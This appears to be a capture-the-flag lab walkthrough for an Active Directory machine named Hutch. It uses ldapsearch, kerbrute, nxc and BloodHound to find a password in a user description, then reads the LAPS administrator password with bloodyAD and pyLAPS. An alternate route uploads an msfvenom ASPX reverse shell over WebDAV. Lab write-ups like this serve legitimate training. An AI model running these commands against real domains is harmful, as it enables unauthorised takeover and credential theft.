nmap - ports 80 web, 135 rpc, 389 ldap, 445 smb, 5985 winrm, 9389?

port 80 -
default IIS page, nothing on dirb

port 135 -
rpc locked down

port 389 -
```zsh
ldapsearch -x -H ldap://192.168.138.122 -s base namingcontexts
ldapsearch -x -H ldap://192.168.138.122 -b "DC=hutch,DC=offsec"

ldapsearch -x -H ldap://192.168.138.122 -b "DC=hutch,DC=offsec" '(objectClass=Person)' sAMAccountName | grep sAMAccountName | awk '{print $2}'
```
gives us a bunch of users
`./kerbrute userenum --dc 192.168.138.122 -d hutch.offsec users.txt` to validate

no asrep-roastable users
So we look back at ldap, for user descriptions, to see if there's any passwords left

`nxc ldap 192.168.138.122 --users`
sure enough, fmcsorley : CrabSharkJellyfish192
we spray creds for different protocols
just a normal hit on smb, nothing special

So, we suck onto bloodhound
`bloodhound-ce-python -u 'fmcsorley' -p 'CrabSharkJellyfish192' -ns 192.168.138.122 -d hutch.offsec -c All --zip`

Bloodhound tells us, fmcsorley has "ReadLAPSpassword" relation over hutchdc.hutch.offsec
Which means we can read the LocalAdministrator Password solution attributes, one of which is, the password itself

`bloodyAD --host 192.168.138.122 -d hutch.offsec -u fmcsorley -p CrabSharkJellyfish192 get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime`
--> gives us `ms-Mcs-AdmPwd: lPx3$LaIRcBkGI`

So we check the admin's password
`nxc smb 192.168.138.122 -u Administrator -p 'lPx3$LaIRcBkGI'`
we get pwned!

---
---
---

Can also use Pylaps https://github.com/p0dalirius/pyLAPS
```zsh
./pyLAPS.py --action get -d "hutch.offsec" -u "fmcsorley" -p "CrabSharkJellyfish192" --dc-ip 192.168.214.122
```
---

Alternate method, as shown by offsec
Port 80 deep scan shows it has webDAV enabled. WebDAV is an extension of http, that allows clients to perform remote web content authoring operations

With valid creds, we can drop a aspx rev shell, and get rce. we can do this with cadaver
```zsh
#prepare msfvenom aspx rshell as rev.aspx
kali@kali:~$ cadaver http://192.168.120.108
Authentication required for 192.168.120.108 on server `192.168.120.108':
Username: fmcsorley
Password: CrabSharkJellyfish192
dav:/> put /usr/share/webshells/aspx/rev.aspx rev.aspx
```
Privesc is the same, except done on ldapsearch
```zsh
ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -h 192.168.120.108 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```